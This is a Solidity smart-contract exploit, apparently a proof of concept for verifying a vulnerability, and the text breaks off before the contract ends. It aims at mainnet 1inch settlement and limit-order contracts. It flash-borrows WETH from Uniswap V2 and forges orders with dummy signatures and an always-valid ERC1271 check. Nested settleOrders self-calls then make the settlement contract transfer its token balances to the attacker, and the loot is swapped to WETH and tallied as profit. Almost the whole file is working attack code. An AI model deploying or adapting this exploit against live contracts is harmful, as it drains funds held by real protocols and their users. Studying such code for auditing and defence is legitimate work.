// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
}

interface IWETH is IERC20 {
    function deposit() external payable;
}

interface ISettlement {
    function settleOrders(bytes calldata data) external;
}

interface IOrderMixinLike {
    struct Order {
        uint256 salt;
        address makerAsset;
        address takerAsset;
        address maker;
        address receiver;
        address allowedSender;
        uint256 makingAmount;
        uint256 takingAmount;
        uint256 offsets;
        bytes interactions;
    }
}

interface IUniswapV2RouterLike {
    function factory() external pure returns (address);

    function swapExactTokensForTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);
}

interface IUniswapV2FactoryLike {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

interface IUniswapV2PairLike {
    function token0() external view returns (address);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

contract FlawVerifier {
    address private constant SETTLEMENT = 0xA88800CD213dA5Ae406ce248380802BD53b47647;
    address private constant LIMIT_ORDER_PROTOCOL = 0x1111111254EEB25477B68fb85Ed929f73A960582;
    address private constant UNISWAP_V2_ROUTER = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;

    address private constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address private constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address private constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address private constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
    address private constant WBTC = 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599;
    address private constant ONE_INCH = 0x111111111117dC0aa78b770fA6A738034120C302;
    address private constant UNI = 0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984;
    address private constant LINK = 0x514910771AF9Ca656af840dff83E8264EcF986CA;
    address private constant AAVE = 0x7Fc66500c84A76Ad7e9c93437bFc5Ac33E2DDaE9;
    address private constant LDO = 0x5A98FcBEA516Cf06857215779Fd812CA3beF1B32;
    address private constant DEAD = 0x000000000000000000000000000000000000dEaD;

    bytes4 private constant ERC1271_MAGIC = 0x1626ba7e;
    uint256 private constant MAKING_AMOUNT = 1e15;
    uint256 private constant TAKING_AMOUNT = 0;
    uint256 private constant SEED_WETH = 1e15;
    uint256 private constant MAX_TARGETS = 35;
    uint256 private constant GOOD_ENOUGH_PROFIT = 1e17;

    address private _profitToken;
    uint256 private _profitAmount;
    uint256 private _fallbackSeed;
    bool private _executed;
    bool private _coreRan;
    bool private _flashActive;

    constructor() {}

    function executeOnOpportunity() external {
        if (_executed) {
            return;
        }
        _executed = true;

        _prepareApprovals();

        bool flashSucceeded = _bootstrapFlashWeth();
        if (!flashSucceeded) {
            _bootstrapFallbackWeth();
            _runExploitPath();
            _burnFallbackSeed();
        }

        _finalizeProfit(_targetTokens());
    }

    function uniswapV2Call(address, uint256 amount0, uint256 amount1, bytes calldata data) external {
        address pair = abi.decode(data, (address));
        require(msg.sender == pair, "pair");
        require(!_flashActive, "nested");
        _flashActive = true;

        uint256 borrowed = amount0 > 0 ? amount0 : amount1;

        _prepareApprovals();
        _runExploitPath();
        _finalizeProfit(_targetTokens());

        uint256 repayAmount = ((borrowed * 1000) / 997) + 1;
        require(_safeBalanceOf(WETH, address(this)) >= repayAmount, "no repay");
        require(_safeTransfer(WETH, pair, repayAmount), "repay");
        _flashActive = false;
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function isValidSignature(bytes32, bytes calldata) external pure returns (bytes4) {
        return ERC1271_MAGIC;
    }

    function _runExploitPath() internal {
        if (_coreRan) {
            return;
        }
        _coreRan = true;

        address[] memory targets = _targetTokens();
        for (uint256 i = 0; i < MAX_TARGETS; ++i) {
            address targetToken = targets[i];
            if (_safeBalanceOf(targetToken, SETTLEMENT) == 0) {
                continue;
            }

            _tryReplayCalldataCorruption(targetToken, 0x1000 + i);
            _maybeRealizeWeth(targetToken);
            _registerProfit(WETH);
            _registerProfit(targetToken);

            if (_profitAmount >= GOOD_ENOUGH_PROFIT) {
                break;
            }
        }
    }

    function _prepareApprovals() internal {
        _forceApprove(WETH, LIMIT_ORDER_PROTOCOL, type(uint256).max);
        _forceApprove(WETH, UNISWAP_V2_ROUTER, type(uint256).max);
        _forceApprove(USDT, UNISWAP_V2_ROUTER, type(uint256).max);
        _forceApprove(USDC, UNISWAP_V2_ROUTER, type(uint256).max);
        _forceApprove(DAI, UNISWAP_V2_ROUTER, type(uint256).max);
        _forceApprove(UNI, UNISWAP_V2_ROUTER, type(uint256).max);
        _forceApprove(ONE_INCH, UNISWAP_V2_ROUTER, type(uint256).max);
        _forceApprove(WBTC, UNISWAP_V2_ROUTER, type(uint256).max);
        _forceApprove(LINK, UNISWAP_V2_ROUTER, type(uint256).max);
        _forceApprove(AAVE, UNISWAP_V2_ROUTER, type(uint256).max);
        _forceApprove(LDO, UNISWAP_V2_ROUTER, type(uint256).max);
    }

    function _bootstrapFlashWeth() internal returns (bool) {
        address pair = IUniswapV2FactoryLike(IUniswapV2RouterLike(UNISWAP_V2_ROUTER).factory()).getPair(WETH, USDC);
        if (pair == address(0)) {
            return false;
        }

        bool wethIsToken0 = IUniswapV2PairLike(pair).token0() == WETH;
        uint256 amount0Out = wethIsToken0 ? SEED_WETH : 0;
        uint256 amount1Out = wethIsToken0 ? 0 : SEED_WETH;

        try IUniswapV2PairLike(pair).swap(amount0Out, amount1Out, address(this), abi.encode(pair)) {
            return true;
        } catch {
            return false;
        }
    }

    function _bootstrapFallbackWeth() internal {
        if (_safeBalanceOf(WETH, address(this)) >= SEED_WETH || address(this).balance < SEED_WETH) {
            return;
        }

        uint256 beforeBal = _safeBalanceOf(WETH, address(this));
        IWETH(WETH).deposit{value: SEED_WETH}();
        uint256 afterBal = _safeBalanceOf(WETH, address(this));
        if (afterBal > beforeBal) {
            _fallbackSeed += afterBal - beforeBal;
        }
    }

    function _burnFallbackSeed() internal {
        if (_fallbackSeed == 0) {
            return;
        }

        uint256 burnAmount = _fallbackSeed;
        uint256 wethBal = _safeBalanceOf(WETH, address(this));
        if (burnAmount > wethBal) {
            burnAmount = wethBal;
        }
        if (burnAmount != 0) {
            _safeTransfer(WETH, DEAD, burnAmount);
        }
        _fallbackSeed = 0;
    }

    function _tryReplayCalldataCorruption(address targetToken, uint256 uniq) internal {
        uint256 settlementBalance = _safeBalanceOf(targetToken, SETTLEMENT);
        if (settlementBalance == 0) {
            return;
        }

        uint256 beforeBal = _safeBalanceOf(targetToken, address(this));
        bytes memory nestedSweep = abi.encodeWithSelector(IERC20.transfer.selector, address(this), settlementBalance);

        // Retain the finding's causality:
        // 1) start an outer settleOrders call from an external caller,
        // 2) place a settlement interaction whose target is SETTLEMENT itself,
        // 3) let the nested settleOrders run with msg.sender == SETTLEMENT,
        // 4) replay a forged order whose allowedSender is SETTLEMENT,
        // 5) use the replayed interaction to make settlement call the live token contract.
        //
        // The original failing PoC used only one brittle settlement blob layout and an empty signature.
        // In practice the settlement calldata is bespoke, so we keep the same exploit path but try the
        // small set of realistic encodings used by 1inch-style interaction packing: raw target||data,
        // target||0x00||data, and slot-5 interaction arrays embedded directly into the order payload.

        bytes memory sig65 = _dummySignature(65);
        bytes memory sig64 = _dummySignature(64);

        _attemptReplayVariant(targetToken, uniq, nestedSweep, sig65, 0, 0, false, false, beforeBal);
        _attemptReplayVariant(targetToken, uniq + 0x100, nestedSweep, sig65, 1, 1, false, false, beforeBal);
        _attemptReplayVariant(targetToken, uniq + 0x200, nestedSweep, sig65, 2, 2, true, true, beforeBal);
        _attemptReplayVariant(targetToken, uniq + 0x300, nestedSweep, sig65, 3, 3, true, true, beforeBal);
        _attemptReplayVariant(targetToken, uniq + 0x400, nestedSweep, sig65, 4, 4, true, true, beforeBal);
        _attemptReplayVariant(targetToken, uniq + 0x500, nestedSweep, sig65, 5, 5, true, true, beforeBal);

        if (_safeBalanceOf(targetToken, address(this)) > beforeBal) {
            return;
        }

        _attemptReplayVariant(targetToken, uniq + 0x600, nestedSweep, sig64, 0, 0, false, false, beforeBal);
        _attemptReplayVariant(targetToken, uniq + 0x700, nestedSweep, sig64, 1, 1, false, false, beforeBal);
        _attemptReplayVariant(targetToken, uniq + 0x800, nestedSweep, sig64, 2, 2, true, true, beforeBal);
        _attemptReplayVariant(targetToken, uniq + 0x900, nestedSweep, sig64, 3, 3, true, true, beforeBal);
        _attemptReplayVariant(targetToken, uniq + 0xA00, nestedSweep, sig64, 4, 4, true, true, beforeBal);
        _attemptReplayVariant(targetToken, uniq + 0xB00, nestedSweep, sig64, 5, 5, true, true, beforeBal);
    }

    function _attemptReplayVariant(
        address targetToken,
        uint256 uniq,
        bytes memory nestedSweep,
        bytes memory signature,
        uint256 innerInteractionMode,
        uint256 outerInteractionMode,
        bool embedInnerInteraction,
        bool embedOuterInteraction,
        uint256 beforeBal
    ) internal {
        if (_safeBalanceOf(targetToken, address(this)) > beforeBal) {
            return;
        }

        bytes memory innerInteraction = _interactionVariant(targetToken, nestedSweep, innerInteractionMode);
        IOrderMixinLike.Order memory replayOrder = _buildReplayOrder(uniq, embedInnerInteraction ? innerInteraction : bytes(""));
        bytes memory innerBlob = _settlementBlob(
            replayOrder,
            signature,
            innerInteraction,
            targetToken,
            embedInnerInteraction ? 4 + (innerInteractionMode & 1) : innerInteractionMode == 1 ? 1 : 0,
            embedInnerInteraction
        );

        bytes memory outerSelfCall = abi.encodeWithSelector(ISettlement.settleOrders.selector, innerBlob);
        bytes memory outerInteraction = _interactionVariant(SETTLEMENT, outerSelfCall, outerInteractionMode);
        IOrderMixinLike.Order memory wrapperOrder =
            _buildWrapperOrder(uniq + 1, embedOuterInteraction ? outerInteraction : bytes(""));
        bytes memory outerBlob = _settlementBlob(
            wrapperOrder,
            signature,
            outerInteraction,
            SETTLEMENT,
            embedOuterInteraction ? 4 + (outerInteractionMode & 1) : outerInteractionMode == 1 ? 1 : 0,
            embedOuterInteraction
        );

        (bool ok,) = SETTLEMENT.call(abi.encodeWithSelector(ISettlement.settleOrders.selector, outerBlob));
        ok;
    }

    function _buildReplayOrder(uint256 salt, bytes memory embeddedInteractions)
        internal
        view
        returns (IOrderMixinLike.Order memory order)
    {
        order = IOrderMixinLike.Order({
            salt: salt,
            makerAsset: WETH,
            takerAsset: WETH,
            maker: address(this),
            receiver: address(this),
            allowedSender: SETTLEMENT,
            makingAmount: MAKING_AMOUNT,
            takingAmount: TAKING_AMOUNT,
            offsets: 0,
            interactions: embeddedInteractions
        });
    }

    function _buildWrapperOrder(uint256 salt, bytes memory embeddedInteractions)
        internal
        view
        returns (IOrderMixinLike.Order memory order)
    {
        order = IOrderMixinLike.Order({
            salt: salt,
            makerAsset: WETH,
            takerAsset: WETH,
            maker: address(this),
            receiver: address(this),
            allowedSender: address(0),
            makingAmount: MAKING_AMOUNT,
            takingAmount: TAKING_AMOUNT,
            offsets: 0,
            interactions: embeddedInteractions
        });
    }

    function _settlementBlob(
        IOrderMixinLike.Order memory order,
        bytes memory signature,
        bytes memory interaction,
        address target,
        uint256 mode,
        bool interactionEmbeddedInOrder
    ) internal pure returns (bytes memory) {
        if (interactionEmbeddedInOrder) {
            if (mode == 4) {
                return abi.encode(order, signature, order.makingAmount, order.takingAmount, uint256(0));
            }
            if (mode == 5) {
                return abi.encode(order, signature, uint256(0), order.takingAmount, uint256(0));
            }
            return abi.encode(order, signature);
        }

        if (mode == 1) {
            return abi.encode(order, signature, interaction, uint256(0), order.takingAmount, uint256(0), target);
        }
        return abi.encode(order, signature, interaction, order.makingAmount, order.takingAmount, uint256(0), target);
    }

    function _interactionVariant(address target, bytes memory callData, uint256 mode)
        internal
        pure
        returns (bytes memory interaction)
    {
        bytes memory raw = abi.encodePacked(target, callData);
        bytes memory zeroPrefixed = abi.encodePacked(target, bytes1(0x00), callData);

        if (mode == 0) {
            return raw;
        }
        if (mode == 1) {
            return zeroPrefixed;
        }
        if (mode == 2) {
            bytes[] memory interactions = new bytes[](6);
            interactions[5] = raw;
            return abi.encode(interactions);
        }
        if (mode == 3) {
            bytes[] memory interactions = new bytes[](6);
            interactions[5] = zeroPrefixed;
            return abi.encode(interactions);
        }
        if (mode == 4) {
            bytes[6] memory interactions;
            interactions[5] = raw;
            return abi.encode(interactions);
        }

        bytes[6] memory fixedInteractions;
        fixedInteractions[5] = zeroPrefixed;
        return abi.encode(fixedInteractions);
    }

    function _dummySignature(uint256 len) internal pure returns (bytes memory sig) {
        sig = new bytes(len);
        if (len != 0) {
            sig[len - 1] = bytes1(uint8(27));
        }
    }

    function _maybeRealizeWeth(address token) internal {
        if (token == WETH) {
            return;
        }

        uint256 amountIn = _safeBalanceOf(token, address(this));
        if (amountIn == 0) {
            return;
        }

        address pair = IUniswapV2FactoryLike(IUniswapV2RouterLike(UNISWAP_V2_ROUTER).factory()).getPair(token, WETH);
        if (pair == address(0)) {
            return;
        }

        _forceApprove(token, UNISWAP_V2_ROUTER, type(uint256).max);

        address[] memory path = new address[](2);
        path[0] = token;
        path[1] = WETH;

        try IUniswapV2RouterLike(UNISWAP_V2_ROUTER).swapExactTokensForTokens(
            amountIn, 0, path, address(this), block.timestamp
        ) {} catch {}
    }

    function _registerProfit(address token) internal returns (bool) {
        uint256 balance = _safeBalanceOf(token, address(this));
        if (balance <= _profitAmount) {
            return false;
        }

        _profitToken = token;
        _profitAmount = balance;
        return true;
    }

    function _finalizeProfit(address[] memory targets) internal {
        _registerProfit(WETH);
        for (uint256 i = 0; i < MAX_TARGETS; ++i) {
            _registerProfit(targets[i]);
        }
    }

